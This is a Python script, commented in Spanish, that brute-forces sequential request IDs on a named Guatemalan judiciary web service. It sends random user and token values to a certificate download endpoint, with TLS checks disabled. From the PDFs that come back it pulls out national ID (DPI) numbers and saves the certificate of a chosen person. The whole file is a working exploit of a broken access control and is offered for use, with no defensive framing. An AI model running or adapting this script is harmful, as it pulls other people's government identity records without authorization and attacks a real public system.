import requests
import random
import string
import io
import re
import PyPDF2
import logging
import argparse
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configurar logging
logging.basicConfig(filename='descargas.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def generar_token():
    base = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
    return base + ".."

def generar_usuario():
    return f"-{random.randint(4396100, 4396999)}"

def extraer_dpi_del_pdf(pdf_bytes):
    try:
        pdf = PyPDF2.PdfReader(io.BytesIO(pdf_bytes))
        texto = ""
        for pagina in pdf.pages:
            texto += pagina.extract_text() or ""

        dpi_match = re.search(r'DPI\s+NUMERO\s+(\d{4})\s+(\d{5})\s+(\d{4})', texto)
        if dpi_match:
            dpi = f"{dpi_match.group(1)}_{dpi_match.group(2)}_{dpi_match.group(3)}"
            return dpi
    except Exception as e:
        logging.warning(f"No se pudo leer el PDF: {e}")
    return None

def es_pdf_valido(content):
    return content.startswith(b"%PDF") and b"%%EOF" in content[-1024:]

def procesar_id(id_actual, dpi_buscado, base_url, session):
    usuario = generar_usuario()
    token = generar_token()
    url = base_url.format(id=id_actual, usuario=usuario, token=token)

    try:
        response = session.get(url, verify=False, timeout=5)
        if response.status_code == 200 and es_pdf_valido(response.content):
            dpi_extraido = extraer_dpi_del_pdf(response.content)
            if dpi_extraido == dpi_buscado:
                nombre_archivo = f"constancia_{dpi_extraido}.pdf"
                with open(nombre_archivo, "wb") as f:
                    f.write(response.content)
                print(f"\n✅ DPI encontrado en ID {id_actual} y guardado como: {nombre_archivo}")
                logging.info(f"DPI encontrado en ID {id_actual}")
                return True
    except Exception as e:
        logging.error(f"⚠️ Error con ID {id_actual}: {e}")
    return False

def buscar_y_descargar_dpi(dpi_buscado, inicio_id, fin_id, base_url):
    session = requests.Session()
    found_flag = False

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(procesar_id, id_actual, dpi_buscado, base_url, session): id_actual
                   for id_actual in range(inicio_id, fin_id + 1)}

        for future in tqdm(as_completed(futures), total=len(futures), desc="🔍 Buscando DPI", colour="green"):
            if future.result():
                found_flag = True
                break

    if not found_flag:
        print("❌ DPI no encontrado en el rango especificado.")
    else:
        print("🎉 Búsqueda finalizada con éxito.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Buscar y descargar PDF por DPI")
    parser.add_argument("--dpi", type=str, required=True, help="Número de DPI a buscar en formato 1234_56789_0123")
    parser.add_argument("--inicio", type=int, default=11481717, help="ID inicial")
    parser.add_argument("--fin", type=int, default=11481740, help="ID final")
    parser.add_argument("--url", type=str, required=False,
                        default="https://zunil.oj.gob.gt:24472/CAPE_DMZ/webapi/Constancia/Solicitud/{id}/Usuario/{usuario}/validarAutorizacion/{token}/downloadArchivo",
                        help="URL base con placeholders: {id}, {usuario}, {token}")
    args = parser.parse_args()
    buscar_y_descargar_dpi(args.dpi, args.inicio, args.fin, args.url)

